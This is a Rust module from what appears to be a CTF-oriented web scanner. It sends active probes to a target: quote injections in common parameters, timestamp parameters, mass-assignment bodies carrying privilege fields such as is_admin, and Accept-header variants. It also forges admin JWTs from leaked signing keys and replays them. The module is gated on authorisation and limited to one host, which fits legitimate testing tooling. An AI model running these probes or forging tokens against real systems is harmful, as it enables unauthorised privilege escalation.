//! Active checks: the requests a crawl would never send.
//!
//! Everything else in the scanner is passive. It fetches a page and reads what
//! the page hands back. This half sends what the page did not ask for: a quote
//! in a parameter to draw out a database error, a current timestamp into a
//! window that only opens for now, a privilege field into a profile update, a
//! header a cache was told to vary on. It runs only when the person starting the
//! scan affirmed they are allowed to test the target, because it is the half
//! that touches rather than reads.
//!
//! It is wordlist-driven, the way a directory brute-forcer is. It cannot reach
//! an endpoint the source never names and no list contains, and it cannot guess
//! a payload nobody thought to try. What it catches are the common shapes, tried
//! against the endpoints a scan found and a bundled list of the usual API paths.
//! A challenge that hides a flag behind a made-up header or field it invented
//! stays out of reach until that exact string is added to a list here.

use crate::fetch::{self, Request};
use reqwest::Method;
use std::collections::HashSet;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

/// A flag an active probe drew out, and what drew it.
pub struct Hit {
    pub value: String,
    pub source: String,
    pub note: String,
}

fn flags_in(body: &[u8]) -> Vec<String> {
    trawl_core::bytes::flag_candidates(body)
        .into_iter()
        .filter(|found| trawl_core::bytes::tag_is_known(&found.text))
        .map(|found| found.text)
        .collect()
}

/// The usual places an API keeps things, tried by name against the target's own
/// host. Common shapes, not this or that site's secrets.
const ENDPOINTS: &[&str] = &[
    "api",
    "api/user",
    "api/users",
    "api/user/search",
    "api/users/search",
    "api/search",
    "api/user/profile",
    "api/profile",
    "api/account",
    "api/login",
    "api/config",
    "api/config/dns",
    "api/settings",
    "api/health",
    "api/status",
    "api/telemetry",
    "api/reconcile",
    "api/sync",
    "api/debug",
    "admin",
    "admin/api",
    "admin/api/logs",
    "debug",
    "debug/info",
];

/// Parameter names a search or lookup endpoint tends to take. A quote in one of
/// these is the oldest injection probe there is.
const QUERY_PARAMS: &[&str] = &[
    "q", "query", "name", "search", "term", "keyword", "id", "user", "username", "email",
];

/// Parameters that read as a time, given the current second to see if a window
/// only opens for now.
const TIME_PARAMS: &[&str] = &["ts", "time", "timestamp", "t", "epoch", "now", "at"];

/// Fields an object might accept that it should not, the mass-assignment shape.
const PRIVILEGE_FIELDS: &[(&str, &str)] = &[
    ("role", "\"admin\""),
    ("admin", "true"),
    ("is_admin", "true"),
    ("isAdmin", "true"),
    ("is_staff", "true"),
    ("superuser", "true"),
    ("verified", "true"),
    ("is_verified", "true"),
];

/// Values a cache or a router might vary on, to see if one names an inside path.
const ACCEPT_MARKERS: &[&str] = &[
    "application/json, x-internal",
    "application/json, internal",
    "application/vnd.internal+json",
];

/// A ceiling on how many requests one active pass may send, so a wide wordlist
/// against a slow target cannot run away.
const REQUEST_BUDGET: usize = 300;

/// The longest one probe waits. A window that only opens for a correct value
/// often stalls a wrong one, and the whole pass cannot afford ten seconds each.
const PROBE_TIMEOUT: Duration = Duration::from_secs(4);

/// A wall-clock ceiling on the whole active pass, so a target that stalls every
/// probe still returns a scan rather than hanging the request.
const ACTIVE_DEADLINE: Duration = Duration::from_secs(30);

/// Extracts endpoint-shaped paths a page or script names, so a URL the source
/// mentions but never links is still probed.
fn endpoints_from_source(bodies: &[Vec<u8>]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for body in bodies {
        let text = String::from_utf8_lossy(body);
        let bytes = text.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            // A path starts at a slash that follows a quote or an opening paren,
            // the way one appears inside `fetch("/api/...")`.
            if bytes[i] == b'/' && i > 0 && matches!(bytes[i - 1], b'"' | b'\'' | b'(' | b'`') {
                let start = i;
                let mut end = i;
                while end < bytes.len()
                    && (bytes[end].is_ascii_alphanumeric()
                        || matches!(bytes[end], b'/' | b'_' | b'-' | b'.'))
                {
                    end += 1;
                }
                let path = &text[start..end];
                if path.len() > 3 && (path.contains("/api") || path.contains("/admin")) {
                    let path = path.to_string();
                    if !out.contains(&path) {
                        out.push(path);
                    }
                }
                i = end;
            } else {
                i += 1;
            }
        }
    }
    out
}

fn now_seconds() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// A ceiling on how many hints to take, and how long each may be. A hint is
/// woven into a URL path, a query name, a JSON field and a header, so it is held
/// to characters that are safe in all of them.
const MAX_HINTS: usize = 20;
const MAX_HINT_LEN: usize = 64;

/// Trims each hint to a usable, safe token. A hint is user text that ends up in
/// four different places, so anything that could break a URL, a JSON body or a
/// header is dropped rather than escaped.
fn clean_hints(hints: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for raw in hints {
        let cleaned: String = raw
            .trim()
            .chars()
            .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
            .take(MAX_HINT_LEN)
            .collect();
        if !cleaned.is_empty() && !out.contains(&cleaned) {
            out.push(cleaned);
        }
        if out.len() >= MAX_HINTS {
            break;
        }
    }
    out
}

struct Probe<'a> {
    allow_local: bool,
    budget: &'a mut usize,
    deadline: Instant,
    seen: HashSet<String>,
    hits: Vec<Hit>,
    /// The wordlists a probe draws on, each already carrying any hints the person
    /// gave: a name to try as a parameter, a field, a header marker.
    params: Vec<String>,
    time_params: Vec<String>,
    fields: Vec<(String, String)>,
    accept_markers: Vec<String>,
    /// JWTs seen in any response, and the endpoints that answered, so a token can
    /// be forged and replayed once the crawl has turned both up.
    tokens: Vec<String>,
    existing: Vec<String>,
    /// The page source, for a signing key a site leaks outside its own token.
    source: Vec<u8>,
}

impl Probe<'_> {
    /// Records every new flag a response body carried, tagged with what was sent,
    /// and remembers any JWT in it for the forging pass.
    fn scan(&mut self, url: &str, note: &str, body: &[u8]) {
        for value in flags_in(body) {
            if self.seen.insert(value.clone()) {
                self.hits.push(Hit {
                    value,
                    source: url.to_string(),
                    note: note.to_string(),
                });
            }
        }
        for token in crate::jwt::find_tokens(body) {
            if !self.tokens.contains(&token) {
                self.tokens.push(token);
            }
        }
    }

    /// For every token seen, recovers its key when the site let it slip, forges a
    /// token that names an administrator, and replays it against the endpoints
    /// that answered. The key check is exact, so a token is only forged once its
    /// real key is in hand.
    async fn forge_and_replay(&mut self) {
        for token_str in self.tokens.clone() {
            let Some(token) = crate::jwt::parse(&token_str) else {
                continue;
            };
            let keys = crate::jwt::candidate_keys(&token, &self.source);
            let Some(key) = crate::jwt::recover_key(&token, &keys) else {
                continue;
            };
            let forged = crate::jwt::forge_admin(&token, &key);

            for url in self.existing.clone() {
                if *self.budget == 0 || Instant::now() >= self.deadline {
                    return;
                }
                let request = Request {
                    method: Method::GET,
                    body: None,
                    headers: vec![("authorization".into(), format!("Bearer {forged}"))],
                    timeout: None,
                };
                if let Some(response) = self.send(&url, &request).await {
                    self.scan(
                        &url,
                        "a token forged from a recovered signing key was accepted",
                        &response.body,
                    );
                }
            }
        }
    }

    async fn send(&mut self, url: &str, request: &Request) -> Option<fetch::Fetched> {
        if *self.budget == 0 || Instant::now() >= self.deadline {
            return None;
        }
        *self.budget -= 1;
        let mut request = request.clone();
        request.timeout.get_or_insert(PROBE_TIMEOUT);
        fetch::fetch_with(url, self.allow_local, &request).await.ok()
    }

    /// Whether an endpoint answers to a name, so techniques are not spent on one
    /// the site does not have. A 404 is a no; anything else is worth pressing.
    async fn exists(&mut self, url: &str) -> bool {
        match self.send(url, &Request::default()).await {
            Some(response) => {
                self.scan(url, "at an endpoint probed by name", &response.body);
                response.status != 404
            }
            None => false,
        }
    }

    async fn injection(&mut self, endpoint: &reqwest::Url) {
        for param in self.params.clone() {
            let mut url = endpoint.clone();
            url.query_pairs_mut().append_pair(&param, "'");
            let target = url.to_string();
            if let Some(response) = self.send(&target, &Request::default()).await {
                self.scan(
                    &target,
                    &format!("a quote in the {param} parameter drew out an error"),
                    &response.body,
                );
            }
        }
    }

    async fn timestamp(&mut self, endpoint: &reqwest::Url) {
        let now = now_seconds().to_string();
        for param in self.time_params.clone() {
            let mut url = endpoint.clone();
            url.query_pairs_mut().append_pair(&param, &now);
            let target = url.to_string();
            if let Some(response) = self.send(&target, &Request::default()).await {
                self.scan(
                    &target,
                    &format!("the current time in the {param} parameter was accepted"),
                    &response.body,
                );
            }
        }
    }

    async fn mass_assignment(&mut self, url: &str) {
        let fields: Vec<String> = self
            .fields
            .iter()
            .map(|(name, value)| format!("\"{name}\":{value}"))
            .collect();
        let body = format!("{{{}}}", fields.join(",")).into_bytes();

        for method in [Method::PUT, Method::POST, Method::PATCH] {
            let request = Request {
                method: method.clone(),
                body: Some(body.clone()),
                headers: vec![("content-type".into(), "application/json".into())],
                timeout: None,
            };
            if let Some(response) = self.send(url, &request).await {
                self.scan(
                    url,
                    &format!("{method} with privilege fields in the body was accepted"),
                    &response.body,
                );
            }
        }
    }

    async fn header_variants(&mut self, url: &str) {
        for accept in self.accept_markers.clone() {
            let request = Request {
                method: Method::GET,
                body: None,
                headers: vec![("accept".into(), accept)],
                timeout: None,
            };
            if let Some(response) = self.send(url, &request).await {
                self.scan(
                    url,
                    "an internal marker in the Accept header changed the response",
                    &response.body,
                );
            }
        }
    }
}

/// Runs the active battery against a target, returning the flags it drew out.
///
/// `entry_url` fixes the host; every probe is built against it, so a redirect, a
/// wordlist entry or a hint can never send a crafted request off to another
/// site. `hints` are the person's own leads: a name they suspect is a parameter,
/// a field or a header. Each is tried in all of those places at once, since the
/// person rarely knows which it is, and woven in alongside the built-in list
/// rather than replacing it, so the general checks still run.
pub async fn run(
    entry_url: &str,
    allow_local: bool,
    source_bodies: &[Vec<u8>],
    hints: &[String],
) -> Vec<Hit> {
    let Ok(base) = reqwest::Url::parse(entry_url) else {
        return Vec::new();
    };
    let hints = clean_hints(hints);

    let mut candidates: Vec<String> = Vec::new();
    for path in ENDPOINTS {
        candidates.push((*path).to_string());
    }
    for path in endpoints_from_source(source_bodies) {
        if !candidates.contains(&path) {
            candidates.push(path);
        }
    }
    // A hint might name an endpoint of its own, plain or under /api.
    for hint in &hints {
        for candidate in [hint.clone(), format!("api/{hint}")] {
            if !candidates.contains(&candidate) {
                candidates.push(candidate);
            }
        }
    }

    // The built-in lists, extended with each hint in every position it could be.
    let mut params: Vec<String> = QUERY_PARAMS.iter().map(|s| s.to_string()).collect();
    let mut time_params: Vec<String> = TIME_PARAMS.iter().map(|s| s.to_string()).collect();
    let mut fields: Vec<(String, String)> = PRIVILEGE_FIELDS
        .iter()
        .map(|(name, value)| (name.to_string(), value.to_string()))
        .collect();
    let mut accept_markers: Vec<String> = ACCEPT_MARKERS.iter().map(|s| s.to_string()).collect();
    for hint in &hints {
        params.push(hint.clone());
        time_params.push(hint.clone());
        fields.push((hint.clone(), "true".to_string()));
        accept_markers.push(format!("application/json, {hint}"));
    }

    let mut budget = REQUEST_BUDGET;
    let mut probe = Probe {
        allow_local,
        budget: &mut budget,
        deadline: Instant::now() + ACTIVE_DEADLINE,
        seen: HashSet::new(),
        hits: Vec::new(),
        params,
        time_params,
        fields,
        accept_markers,
        tokens: Vec::new(),
        existing: Vec::new(),
        source: source_bodies.concat(),
    };

    // Tokens the source already carried, before a single probe is sent.
    for body in source_bodies {
        for token in crate::jwt::find_tokens(body) {
            if !probe.tokens.contains(&token) {
                probe.tokens.push(token);
            }
        }
    }

    for path in candidates {
        if *probe.budget == 0 || Instant::now() >= probe.deadline {
            break;
        }
        let Ok(endpoint) = base.join(&path) else {
            continue;
        };
        // Same host only: a wordlist is data, and data does not get to redirect a
        // crafted request to a target the person did not name.
        if endpoint.host_str() != base.host_str() {
            continue;
        }
        let url = endpoint.to_string();

        if !probe.exists(&url).await {
            continue;
        }
        probe.existing.push(url.clone());

        probe.injection(&endpoint).await;
        probe.timestamp(&endpoint).await;
        probe.mass_assignment(&url).await;
        probe.header_variants(&url).await;
    }

    // Last, because it needs both a token and the endpoints that answered, which
    // only the pass above turns up.
    probe.forge_and_replay().await;

    probe.hits
}

#[cfg(test)]
mod tests;
